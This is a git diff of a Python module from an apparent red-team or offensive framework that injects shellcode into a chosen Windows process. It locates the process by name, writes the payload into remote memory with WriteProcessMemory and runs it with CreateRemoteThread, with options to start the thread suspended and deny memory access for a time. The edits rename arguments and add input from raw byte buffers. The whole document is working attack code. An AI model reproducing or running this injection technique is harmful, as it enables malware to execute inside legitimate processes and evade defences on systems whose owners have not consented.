@@ -1,5 +1,11 @@
+########################################################
+### Injection Module
+### Status: untested
+### Passed: (x) manual tests () task
+########################################################
+
 import os
-#import ctypes
+#import subprocess
 from utils.windef import *
 from utils.winconst import *
 
@@ -9,17 +15,15 @@ from utils.helper import CheckFile, GetFileInfo
 CATEGORY = 'inject'
 
 def register_arguments(parser):
-            parser.add_argument('-i', '--input', help='Input file for process injection')
+            parser.add_argument('-i', '--input', help='Input file or buffer for process injection')
             parser.add_argument('-p', '--process', help='Processname to inject the shellcode')
 
             grp = parser.add_argument_group('additional')
             grp.add_argument('-r', '--resume-thread', action='store_true', help='Start thread suspended and resume after speciefied time')
-            grp.add_argument('-s', '--start', action='store_true', help='If not active, start the process before injection')
+            grp.add_argument('-s', '--start-process', action='store_true', help='If not active, start the process before injection')
             grp.add_argument('-v', '--virtual-protect', action='store_true', help='Deny access on memory for a specified time')
 
-class inject:
-    #from ctypes import windll
-    #from ctypes import wintypes
+class module:
     from urllib import request
     from time import sleep
     import wmi
@@ -27,18 +31,18 @@ class inject:
 
     Author = 'cpu0x00, psycore8'
     Description = 'Inject shellcode to process'
-    Version = '2.1.0'
+    Version = '2.1.3'
     DisplayName = 'INJECTION'
     delay = 5
     data_size = 0
     hash = ''
     pid = int
-    ntcrt = False
+    relay = False
 
-    def __init__(self, input_file, process_start, target_process, shellcode, resume_thread=None, virtual_protect=None):
-        self.input_file = input_file
-        self.process_start = process_start
-        self.target_process = target_process
+    def __init__(self, input, process, start_process, shellcode=None, resume_thread=None, virtual_protect=None):
+        self.input = input
+        self.process_start = start_process
+        self.target_process = process
         self.shellcode = shellcode
         self.resume_thread = resume_thread
         self.virtual_protect = virtual_protect
@@ -46,10 +50,10 @@ class inject:
     def msg(self, message_type, ErrorExit=False):
         messages = {
             'pre.head'       : f'{nstate.FormatModuleHeader(self.DisplayName, self.Version)}\n',
-            'error.input'    : f'{nstate.s_fail} File {self.input_file} not found or cannot be opened.',    
+            'error.input'    : f'{nstate.s_fail} File {self.input} not found or cannot be opened.',    
             'post.done'      : f'{nstate.s_ok} DONE!',
-            'proc.input_ok'  : f'{nstate.s_ok} File {self.input_file} loaded\n{nstate.s_ok} Size of shellcode {self.data_size} bytes\n{nstate.s_ok} Hash: {self.hash}',
-            'proc.input_try' : f'{nstate.s_note} Try to open file {self.input_file}',
+            'proc.input_ok'  : f'{nstate.s_ok} File {self.input} loaded\n{nstate.s_ok} Size of shellcode {self.data_size} bytes\n{nstate.s_ok} Hash: {self.hash}',
+            'proc.input_try' : f'{nstate.s_note} Try to open file {self.input}',
             'proc.try'       : f'{nstate.s_note} Try to execute shellcode',
             'inj.run'        : f'{nstate.s_note} starting {self.target_process}',
             'inj.pid'        : f'{nstate.s_ok} {self.target_process} process id: {self.pid}',
@@ -70,18 +74,23 @@ class inject:
 
     def Start_Process(self):
         self.msg('inj.run')
+        #subprocess.Popen([self.target_process], creationflags=subprocess.DETACHED_PROCESS)
         os.system(self.target_process)
 
     def get_proc_id(self):
+        #print(self.target_process)
         processes = self.wmi.WMI().Win32_Process(name=self.target_process)
         self.pid = processes[0].ProcessId
         self.msg('inj.pid')
         return int(self.pid)
 
     def start_injection(self):
-        if self.Start_Process:
+        if self.process_start:
             s = self.threading.Thread(target=self.Start_Process)
             s.start()
+            #self.Start_Process()
+            #print('x')
+            #subprocess.Popen([self.target_process], creationflags=subprocess.DETACHED_PROCESS)
             self.sleep(3)
 
         process_id = self.get_proc_id()
@@ -94,8 +103,7 @@ class inject:
         if memory:
             self.msg('inj.alloc')
 
-        #c_null = ctypes.c_int(0)
-        writing = WriteProcessMemory(phandle, memory, self.shellcode, len(self.shellcode), 0) ##ctypes.byref(c_null))
+        writing = WriteProcessMemory(phandle, memory, self.shellcode, len(self.shellcode), 0)
         if writing:
             self.msg('inj.write')
         if self.virtual_protect:
@@ -105,9 +113,6 @@ class inject:
         if self.resume_thread or self.virtual_protect:
             self.msg('inj.susp')
             Injection = CreateRemoteThread(phandle, None, 0, memory, None, 0x00000004, None)
-        elif self.ntcrt:
-            th = HANDLE()
-            Injection = pNtCreateThreadEx(ctypes.byref(th), ACCESS_MASK(GENERIC_ALL), None, phandle, memory, None, False, 0, 0, 0, None)
         else:
             Injection = CreateRemoteThread(phandle, None, 0, memory, None, EXECUTE_IMMEDIATLY, None)
 
@@ -132,19 +137,23 @@ class inject:
     
     def open_file(self):
         try:
-            with open(self.input_file, 'rb') as file:
+            with open(self.input, 'rb') as file:
                 self.shellcode = file.read()
         except FileNotFoundError:
             return False
     
     def process(self):
         self.msg('pre.head')
-        self.msg('proc.input_try')
-        if CheckFile(self.input_file):
-            self.data_size, self.hash = GetFileInfo(self.input_file)
+        if isinstance(self.input, str):
+            self.msg('proc.input_try')
+            CheckFile(self.input)
+            self.data_size, self.hash = GetFileInfo(self.input)
             self.msg('proc.input_ok')
             self.open_file()
             self.msg('proc.try')
+            self.start_injection()
+        elif isinstance(self.input, bytes):
+            self.shellcode = self.input
             self.start_injection()
         else:
             self.msg('error.input', True)
